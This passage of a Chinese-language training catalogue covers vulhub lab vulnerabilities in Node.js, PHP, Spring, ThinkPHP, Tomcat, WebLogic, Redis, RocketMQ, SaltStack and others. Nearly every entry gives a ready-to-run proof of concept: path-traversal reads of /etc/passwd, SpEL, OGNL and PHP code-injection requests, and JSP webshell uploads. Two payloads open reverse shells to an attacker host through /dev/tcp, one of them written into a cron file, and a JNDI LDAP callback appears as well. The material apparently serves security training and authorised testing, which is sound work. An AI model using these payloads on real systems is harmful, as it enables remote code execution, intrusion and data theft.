  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/nacos/CVE-2021-29442/poc.py`
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/nacos/CVE-2021-29442/evil.jar`

**PoC：**

```bash
python poc.py -t http://<target-ip>:8848 -c "id"
```

---

## Node.js

### CVE-2017-14849 — 静态文件服务路径穿越

- **影响版本：** Node.js 8.5.0
- **漏洞类型：** 路径规范化绕过
- **目录：** `node/CVE-2017-14849`
- **出处：** `/Users/illya/Projects/vulhub-master/node/CVE-2017-14849/README.md`
- **靶场应用文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/node/CVE-2017-14849/www/app.js`

**PoC：**

```bash
curl 'http://<target-ip>:3000/static/../../../a/../../../../etc/passwd'
```

---

### CVE-2017-16082 — node-postgres 代码注入

- **影响版本：** node-postgres 7.1.0
- **漏洞类型：** 通过 PostgreSQL 字段名注入 Node.js 代码
- **目录：** `node/CVE-2017-16082`
- **出处：** `/Users/illya/Projects/vulhub-master/node/CVE-2017-16082/README.md`
- **靶场应用文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/node/CVE-2017-16082/www/app.js`

**PoC：**

```sql
SELECT 1 AS "\']=0;require=process.mainModule.constructor._load;/*",
       2 AS "*/p=require(`child_process`);/*",
       3 AS "*/p.exec(`id`)//"
```

---

## Openfire

### CVE-2023-32315 — 认证绕过 + 插件上传 RCE

- **影响版本：** Openfire < 4.7.4, < 4.6.7
- **漏洞类型：** UTF-16 路径穿越（setup 环境绕过认证）
- **目录：** `openfire/CVE-2023-32315`
- **出处：** `/Users/illya/Projects/vulhub-master/openfire/CVE-2023-32315/README.md`

**PoC：**

```bash
# 步骤 1：利用路径穿越创建管理员账号（在 setup 模式下）
curl 'http://<target-ip>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=CSRF_TOKEN&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User' \
  -H 'Cookie: csrf=CSRF_TOKEN'

# 步骤 2：使用创建的账号登录并上传恶意插件执行命令
```

---

## PHP

### PHP 8.1.0-dev 后门 — User-Agentt 头代码注入

- **影响版本：** PHP 8.1.0-dev (2021-03-28 供应链攻击版本)
- **漏洞类型：** 后门（zerodium 触发器）
- **目录：** `php/8.1-backdoor`
- **出处：** `/Users/illya/Projects/vulhub-master/php/8.1-backdoor/README.md`
- **靶场应用文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/php/8.1-backdoor/index.php`

**PoC：**

```bash
curl http://<target-ip>:8080/index.php \
  -H "User-Agentt: zerodiumsystem('id');"
```

---

### CVE-2012-1823 — PHP-CGI 参数注入 RCE

- **影响版本：** PHP < 5.3.12, < 5.4.2（PHP-CGI 模式）
- **漏洞类型：** CGI 参数传递导致代码执行
- **目录：** `php/CVE-2012-1823`
- **出处：** `/Users/illya/Projects/vulhub-master/php/CVE-2012-1823/README.md`
- **靶场应用文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/php/CVE-2012-1823/www/index.php`
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/php/CVE-2012-1823/www/info.php`

**PoC：**

```bash
curl "http://<target-ip>/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input" \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '<?php echo shell_exec("id"); ?>'
```

---

### CVE-2019-11043 — PHP-FPM 缓冲区溢出 RCE

- **影响版本：** PHP-FPM 7.1.x < 7.1.33, 7.2.x < 7.2.24, 7.3.x < 7.3.11
- **漏洞类型：** FastCGI 协议解析缓冲区溢出
- **目录：** `php/CVE-2019-11043`
- **出处：** `/Users/illya/Projects/vulhub-master/php/CVE-2019-11043/README.md`
- **靶场应用文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/php/CVE-2019-11043/www/index.php`

**PoC：**

```bash
# 使用 phuip-fpizdam 工具
go get github.com/neex/phuip-fpizdam
phuip-fpizdam http://<target-ip>:8080/index.php
```

---

### PHP XDebug 远程调试 RCE

- **影响版本：** PHP with XDebug（remote_enable=On, remote_connect_back=On）
- **漏洞类型：** DBGp 协议任意代码执行
- **目录：** `php/xdebug-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/php/xdebug-rce/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/php/xdebug-rce/exp.py`

**PoC：**

```bash
python3 exp.py \
  -t http://<target-ip>:8080/index.php \
  -c 'system("id");' \
  --dbgp-ip <attacker-ip>
```

---

## Rails

### CVE-2019-5418 — Accept 头路径穿越文件读取

- **影响版本：** Rails < 5.2.2.1, < 5.1.6.2, < 5.0.7.2, < 4.2.11.1
- **漏洞类型：** 路径穿越（任意文件读取）
- **目录：** `rails/CVE-2019-5418`
- **出处：** `/Users/illya/Projects/vulhub-master/rails/CVE-2019-5418/README.md`

**PoC：**

```bash
curl http://<target-ip>:3000/robots \
  -H 'Accept: ../../../../../../../../etc/passwd{{'
```

---

## Redis

### CVE-2022-0543 — Lua 沙箱逃逸 RCE

- **影响版本：** Debian/Ubuntu 打包的 Redis（Lua 包暴露 `package` 变量）
- **漏洞类型：** Lua 沙箱逃逸
- **目录：** `redis/CVE-2022-0543`
- **出处：** `/Users/illya/Projects/vulhub-master/redis/CVE-2022-0543/README.md`

**PoC：**

```bash
redis-cli -h <target-ip> EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
   local io = io_l();
   local f = io.popen("id", "r");
   return f:read("*a")' \
  0
```

---

## RocketMQ

### CVE-2023-33246 — 命令注入 RCE

- **影响版本：** RocketMQ <= 5.1.0
- **漏洞类型：** rocketmqHome 配置参数命令注入
- **目录：** `rocketmq/CVE-2023-33246`
- **出处：** `/Users/illya/Projects/vulhub-master/rocketmq/CVE-2023-33246/README.md`

**PoC：**

```bash
java -jar rocketmq-attack-1.0-SNAPSHOT.jar \
  AttackBroker \
  --target <target-ip>:10911 \
  --cmd "touch /tmp/rocketmq_pwned"
```

---

### CVE-2023-37582 — NameServer 任意文件写入

- **影响版本：** RocketMQ <= 5.1.1
- **漏洞类型：** configStorePath 任意文件写入
- **目录：** `rocketmq/CVE-2023-37582`
- **出处：** `/Users/illya/Projects/vulhub-master/rocketmq/CVE-2023-37582/README.md`

**PoC：**

```bash
java -jar rocketmq-attack-1.1-SNAPSHOT.jar \
  AttackNamesrv \
  --target <target-ip>:9876 \
  --path "/etc/cron.d/backdoor" \
  --content "* * * * * root bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"
```

---

## SaltStack

### CVE-2020-11651 — 认证绕过 RCE

- **影响版本：** SaltStack 2019.2.3
- **漏洞类型：** ClearFuncs 认证绕过
- **目录：** `saltstack/CVE-2020-11651`
- **出处：** `/Users/illya/Projects/vulhub-master/saltstack/CVE-2020-11651/README.md`

**PoC：**

```bash
python exploit.py --master <target-ip> --exec "touch /tmp/salt_pwned"
```

---

### CVE-2020-16846 — SSH 模块命令注入 RCE

- **影响版本：** SaltStack（2020年11月）
- **漏洞类型：** SSH 模块参数命令注入
- **目录：** `saltstack/CVE-2020-16846`
- **出处：** `/Users/illya/Projects/vulhub-master/saltstack/CVE-2020-16846/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:8000/run \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'token=TOKEN&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/salt_ssh_pwned%3b'
```

---

## Spring Framework

### CVE-2016-4977 — Spring Security OAuth SpEL 注入

- **影响版本：** Spring Security OAuth
- **漏洞类型：** SpEL 表达式注入
- **目录：** `spring/CVE-2016-4977`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2016-4977/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/spring/CVE-2016-4977/poc.py`

**PoC：**

```bash
curl "http://<target-ip>:8080/oauth/authorize?response_type=\${233*233}&client_id=acme&scope=openid&redirect_uri=http://test"
```

---

### CVE-2017-4971 — Spring WebFlow SpEL 注入 RCE

- **影响版本：** Spring WebFlow 2.4.x
- **漏洞类型：** SpEL 表达式绑定注入
- **目录：** `spring/CVE-2017-4971`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2017-4971/README.md`

**PoC（表单字段 payload）：**

```
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1")).start()=vulhub
```

---

### CVE-2017-8046 — Spring Data REST SpEL 注入 RCE

- **影响版本：** Spring Data REST 2.6.6
- **漏洞类型：** PATCH 请求路径中的 SpEL 注入
- **目录：** `spring/CVE-2017-8046`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2017-8046/README.md`

**PoC：**

```http
PATCH /customers/1 HTTP/1.1
Host: <target-ip>:8080
Content-Type: application/json-patch+json

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]
```

---

### CVE-2018-1270 — Spring Messaging STOMP SpEL 注入 RCE

- **影响版本：** Spring Messaging 5.0.4
- **漏洞类型：** STOMP 订阅 selector 中的 SpEL 注入
- **目录：** `spring/CVE-2018-1270`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2018-1270/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/spring/CVE-2018-1270/exploit.py`

**PoC：**

```bash
python exploit.py <target-ip> 8080
# 订阅 selector payload:
# T(java.lang.Runtime).getRuntime().exec('touch /tmp/spring_stomp_pwned')
```

---

### CVE-2018-1273 — Spring Data Commons SpEL 注入 RCE

- **影响版本：** Spring Data Commons 2.0.5
- **漏洞类型：** 用户名字段 SpEL 注入
- **目录：** `spring/CVE-2018-1273`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2018-1273/README.md`

**PoC：**

```bash
curl -X POST 'http://<target-ip>:8080/users?page=&size=5' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/spring_data_pwned")]=&password=&repeatedPassword='
```

---

### CVE-2022-22963 — Spring Cloud Function SpEL 注入 RCE

- **影响版本：** Spring Cloud Function 3.2.2
- **漏洞类型：** routing-expression 请求头 SpEL 注入
- **目录：** `spring/CVE-2022-22963`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2022-22963/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/spring_cloud_pwned")' \
  -H 'Content-Type: text/plain' \
  -d 'test'
```

---

### CVE-2022-22965 (Spring4Shell) — ClassLoader 操控 RCE

- **影响版本：** Spring Framework（JDK 9+，以 WAR 部署到 Tomcat）
- **漏洞类型：** 数据绑定利用 ClassLoader 修改日志配置写 Webshell
- **目录：** `spring/CVE-2022-22965`
- **出处：** `/Users/illya/Projects/vulhub-master/spring/CVE-2022-22965/README.md`

**PoC：**

```bash
# 步骤 1：修改 Tomcat 日志配置，将 pattern 设为 Webshell 内容
curl "http://<target-ip>:8080/hello?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
  -H 'suffix: %>//' \
  -H 'c1: Runtime' \
  -H 'c2: <%'

# 步骤 2：访问写入的 Webshell
curl 'http://<target-ip>:8080/tomcatwar.jsp?pwd=j&cmd=id'
```

---

## Supervisor

### CVE-2017-11610 — XML-RPC 任意方法调用 RCE

- **影响版本：** Supervisord 3.3.2
- **漏洞类型：** XML-RPC 未授权方法调用链
- **目录：** `supervisor/CVE-2017-11610`
- **出处：** `/Users/illya/Projects/vulhub-master/supervisor/CVE-2017-11610/README.md`
- **PoC 文件：**
  - `/Users/illya/Projects/202511培训工具材料/第一天/1day-白天练习环境/vulhub-master/supervisor/CVE-2017-11610/poc.py`

**PoC：**

```http
POST /RPC2 HTTP/1.1
Host: <target-ip>:9001
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>touch /tmp/supervisor_pwned</string>
</param>
</params>
</methodCall>
```

---

## ThinkPHP

### ThinkPHP 2.x — preg_replace /e 修饰符 RCE

- **影响版本：** ThinkPHP 2.x, 3.0（Lite 模式）
- **漏洞类型：** `preg_replace` /e 修饰符代码执行
- **目录：** `thinkphp/2-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/thinkphp/2-rce/README.md`

**PoC：**

```bash
curl "http://<target-ip>:8080/index.php?s=/index/index/name/\${@phpinfo()}"
curl "http://<target-ip>:8080/index.php?s=/index/index/name/\${@system('id')}"
```

---

### ThinkPHP 5.0.x — 控制器名处理不当 RCE

- **影响版本：** ThinkPHP 5.0.20 - 5.0.22
- **漏洞类型：** 路由控制器参数注入
- **目录：** `thinkphp/5-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/thinkphp/5-rce/README.md`

**PoC：**

```bash
curl "http://<target-ip>:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

---

### ThinkPHP 5.0.23 — 请求方法处理不当 RCE

- **影响版本：** ThinkPHP 5.0.23
- **漏洞类型：** `_method=__construct` 构造函数注入
- **目录：** `thinkphp/5.0.23-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/thinkphp/5.0.23-rce/README.md`

**PoC：**

```bash
curl -X POST "http://<target-ip>:8080/index.php?s=captcha" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'
```

---

### ThinkPHP lang-rce — pearcmd 本地文件包含 RCE

- **影响版本：** ThinkPHP < 6.0.13
- **漏洞类型：** lang 参数本地文件包含（pearcmd.php）
- **目录：** `thinkphp/lang-rce`
- **出处：** `/Users/illya/Projects/vulhub-master/thinkphp/lang-rce/README.md`

**PoC：**

```bash
curl "http://<target-ip>:8080/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/tmp/shell.php"

# 访问创建的 shell
curl "http://<target-ip>:8080/?lang=../../../../../../../../tmp/shell"
```

---

## Apache Tomcat

### CVE-2017-12615 — PUT 方法任意文件上传 RCE

- **影响版本：** Tomcat 8.5.19（readonly=false）
- **漏洞类型：** PUT 方法写入 JSP Webshell
- **目录：** `tomcat/CVE-2017-12615`
- **出处：** `/Users/illya/Projects/vulhub-master/tomcat/CVE-2017-12615/README.md`

**PoC：**

```bash
# 上传 JSP Webshell
curl -X PUT "http://<target-ip>:8080/shell.jsp/" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'

# 执行命令
curl "http://<target-ip>:8080/shell.jsp?cmd=id"
```

---

### CVE-2025-24813 — Session 反序列化 RCE

- **影响版本：** Tomcat 9.0.0-M1 - 9.0.97, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2
- **漏洞类型：** 文件持久化 Session 反序列化
- **目录：** `tomcat/CVE-2025-24813`
- **出处：** `/Users/illya/Projects/vulhub-master/tomcat/CVE-2025-24813/README.md`

**PoC：**

```bash
# 步骤 1：通过 partial PUT 上传序列化 Gadget（写入 session 文件）
curl -X PUT "http://<target-ip>:8080/upload" \
  -H 'Content-Type: application/octet-stream' \
  -H 'Content-Range: bytes 0-999/1000' \
  --data-binary @ysoserial-payload.ser

# 步骤 2：设置 JSESSIONID 触发反序列化
curl "http://<target-ip>:8080/" \
  -H 'Cookie: JSESSIONID=.session-filename'
```

---

## Oracle WebLogic

### CVE-2017-10271 — XMLDecoder 反序列化 RCE

- **影响版本：** WebLogic < 10.3.6
- **漏洞类型：** XMLDecoder 反序列化
- **目录：** `weblogic/CVE-2017-10271`
- **出处：** `/Users/illya/Projects/vulhub-master/weblogic/CVE-2017-10271/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:7001/wls-wsat/CoordinatorPortType \
  -H 'Content-Type: text/xml' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="3">
    <void index="0"><string>/bin/bash</string></void>
    <void index="1"><string>-c</string></void>
    <void index="2"><string>touch /tmp/weblogic_pwned</string></void>
  </array>
  <void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>'
```

---

### CVE-2018-2628 — T3 协议反序列化 RCE

- **影响版本：** WebLogic 10.3.6.0
- **漏洞类型：** WLS Core Components T3 反序列化
- **目录：** `weblogic/CVE-2018-2628`
- **出处：** `/Users/illya/Projects/vulhub-master/weblogic/CVE-2018-2628/README.md`

**PoC：**

```bash
# 使用 ysoserial 的 JRMP 模式
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 "touch /tmp/weblogic_t3"

# 发送利用包
python exploit.py <target-ip> 7001 <attacker-ip> 9999
```

---

### CVE-2018-2894 — Web Service 测试页文件上传 RCE

- **影响版本：** WebLogic 12.2.1.3
- **漏洞类型：** 任意文件上传（开发测试页）
- **目录：** `weblogic/CVE-2018-2894`
- **出处：** `/Users/illya/Projects/vulhub-master/weblogic/CVE-2018-2894/README.md`

**PoC：**

```bash
# 步骤 1：修改 Work Home Dir 为可访问 Web 目录
curl -X POST "http://<target-ip>:7001/ws_utc/begin.do" \
  --data 'currentWorkDir=/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css'

# 步骤 2：上传 JSP Webshell
curl -F "file=@shell.jsp" "http://<target-ip>:7001/ws_utc/upload.do"
```

---

### CVE-2020-14882 / CVE-2020-14883 — 控制台未授权 RCE

- **影响版本：** WebLogic 12.2.1.3
- **漏洞类型：** 认证绕过 + 控制台命令执行
- **目录：** `weblogic/CVE-2020-14882`
- **出处：** `/Users/illya/Projects/vulhub-master/weblogic/CVE-2020-14882/README.md`

**PoC：**

```bash
# 认证绕过 + 直接命令执行
curl "http://<target-ip>:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/weblogic_14882');\")"
```

---

### CVE-2023-21839 — JNDI 未授权远程绑定 RCE

- **影响版本：** WebLogic 12.2.1.3, 12.2.1.4, 14.1.1
- **漏洞类型：** T3/IIOP 未授权 JNDI lookup
- **目录：** `weblogic/CVE-2023-21839`
- **出处：** `/Users/illya/Projects/vulhub-master/weblogic/CVE-2023-21839/README.md`

**PoC：**

```bash
python CVE-2023-21839.py \
  -ip <target-ip> \
  -p 7001 \
  -l ldap://<attacker-ip>:1389/Exploit
```

---

## XXL-JOB

### 未授权访问执行器 — 任意命令执行 RCE

- **影响版本：** XXL-JOB 2.2.0
- **漏洞类型：** 未授权访问执行器接口
- **目录：** `xxl-job/unacc`
- **出处：** `/Users/illya/Projects/vulhub-master/xxl-job/unacc/README.md`

**PoC：**

```bash
curl -X POST http://<target-ip>:9999/run \
  -H 'Content-Type: application/json' \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "touch /tmp/xxljob_pwned",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

---

## 统计汇总

| 编号 | 漏洞 / CVE | 影响软件 | 漏洞类型 |
|------|-----------|----------|---------|
| 1 | CVE-2023-46604 | Apache ActiveMQ | OpenWire 反序列化 |
| 2 | CVE-2022-41678 | Apache ActiveMQ | Jolokia MBean Webshell |
| 3 | CVE-2021-25646 | Apache Druid | JavaScript 代码注入 |
| 4 | CVE-2021-41773 | Apache HTTP Server | 路径穿越 + CGI |
| 5 | CVE-2020-9496 | Apache OFBiz | XMLRPC 反序列化 |
| 6 | CVE-2023-49070 | Apache OFBiz | XMLRPC 反序列化绕过 |
| 7 | CVE-2023-51467 | Apache OFBiz | Groovy 注入 |
| 8 | CVE-2024-38856 | Apache OFBiz | Groovy Unicode 绕过 |
| 9 | CVE-2024-45195 | Apache OFBiz | 文件上传 + 反序列化 |
| 10 | CVE-2016-4437 | Apache Shiro | RememberMe 反序列化 |
| 11 | CVE-2017-12629 | Apache Solr | RunExecutableListener |
| 12 | S2-005 | Apache Struts2 | OGNL 参数名注入 |
| 13 | S2-007 | Apache Struts2 | 表单验证 OGNL 注入 |
| 14 | S2-032 | Apache Struts2 | DMI OGNL 注入 |
| 15 | S2-045 (CVE-2017-5638) | Apache Struts2 | Content-Type OGNL |
| 16 | S2-052 | Apache Struts2 | REST XML 反序列化 |
| 17 | S2-053 | Apache Struts2 | Freemarker OGNL |
| 18 | S2-057 (CVE-2018-11776) | Apache Struts2 | Namespace OGNL |
| 19 | S2-059 (CVE-2019-0230) | Apache Struts2 | 标签属性二次求值 |
| 20 | aria2 rce | Aria2 | 未授权 RPC 文件写入 |
| 21 | CVE-2014-6271 | Bash | Shellshock CGI 注入 |
| 22 | CVE-2023-22527 | Confluence | OGNL 注入 |
| 23 | Docker unauthorized | Docker | 未授权 API |
| 24 | CVE-2018-7600 | Drupal | Form API RCE |
| 25 | CVE-2015-1427 | Elasticsearch | Groovy 沙箱逃逸 |
| 26 | CVE-2017-18349 | Fastjson 1.2.24 | JNDI 注入 |
| 27 | Fastjson 1.2.47 | Fastjson 1.2.47 | JNDI 注入绕过白名单 |
| 28 | Flask SSTI | Flask/Jinja2 | SSTI |
| 29 | CVE-2017-12149 | JBoss | HttpInvoker 反序列化 |
| 30 | CVE-2017-1000353 | Jenkins | 未授权反序列化 |
| 31 | CVE-2023-25194 | Apache Kafka | JNDI 注入 |
| 32 | CVE-2021-3129 | Laravel | Ignition Phar 反序列化 |
| 33 | CVE-2021-44228 | Log4j2 | JNDI 注入 (Log4Shell) |
| 34 | CVE-2021-29441 | Nacos | User-Agent 认证绕过 |
| 35 | CVE-2021-29442 | Nacos | Derby SQL RCE |
| 36 | CVE-2017-14849 | Node.js | 路径穿越 |
| 37 | CVE-2017-16082 | node-postgres | 代码注入 |
| 38 | CVE-2023-32315 | Openfire | 认证绕过插件上传 |
| 39 | PHP 8.1.0-dev 后门 | PHP | User-Agentt 后门 |
| 40 | CVE-2012-1823 | PHP-CGI | 参数注入 |
| 41 | CVE-2019-11043 | PHP-FPM | 缓冲区溢出 |
| 42 | PHP XDebug | PHP XDebug | DBGp 远程调试 |
| 43 | CVE-2019-5418 | Rails | Accept 头路径穿越 |
| 44 | CVE-2022-0543 | Redis | Lua 沙箱逃逸 |
| 45 | CVE-2023-33246 | RocketMQ | 命令注入 |
| 46 | CVE-2023-37582 | RocketMQ | 任意文件写入 |
| 47 | CVE-2020-11651 | SaltStack | 认证绕过 |
| 48 | CVE-2020-16846 | SaltStack | SSH 模块命令注入 |
| 49 | CVE-2016-4977 | Spring Security OAuth | SpEL 注入 |
| 50 | CVE-2017-4971 | Spring WebFlow | SpEL 注入 |
| 51 | CVE-2017-8046 | Spring Data REST | SpEL 注入 |
| 52 | CVE-2018-1270 | Spring Messaging | STOMP SpEL 注入 |
| 53 | CVE-2018-1273 | Spring Data Commons | SpEL 注入 |
| 54 | CVE-2022-22963 | Spring Cloud Function | SpEL 注入 |
| 55 | CVE-2022-22965 (Spring4Shell) | Spring Framework | ClassLoader Webshell |
| 56 | CVE-2017-11610 | Supervisor | XML-RPC 方法链 |
| 57 | ThinkPHP 2.x | ThinkPHP | preg_replace /e |
| 58 | ThinkPHP 5.0.x | ThinkPHP | 路由控制器注入 |
| 59 | ThinkPHP 5.0.23 | ThinkPHP | 构造函数注入 |
| 60 | ThinkPHP lang-rce | ThinkPHP | LFI + pearcmd |
| 61 | CVE-2017-12615 | Apache Tomcat | PUT 上传 Webshell |
| 62 | CVE-2025-24813 | Apache Tomcat | Session 反序列化 |
| 63 | CVE-2017-10271 | Oracle WebLogic | XMLDecoder 反序列化 |
| 64 | CVE-2018-2628 | Oracle WebLogic | T3 反序列化 |
| 65 | CVE-2018-2894 | Oracle WebLogic | 测试页文件上传 |
| 66 | CVE-2020-14882/14883 | Oracle WebLogic | 控制台未授权 RCE |
| 67 | CVE-2023-21839 | Oracle WebLogic | JNDI 未授权绑定 |
| 68 | XXL-JOB 未授权 | XXL-JOB | 执行器未授权命令 |

**合计：68 个 RCE / 高危漏洞**

---

*本文档仅用于安全研究、CTF 及授权渗透测试学习，请勿用于未授权攻击行为。*
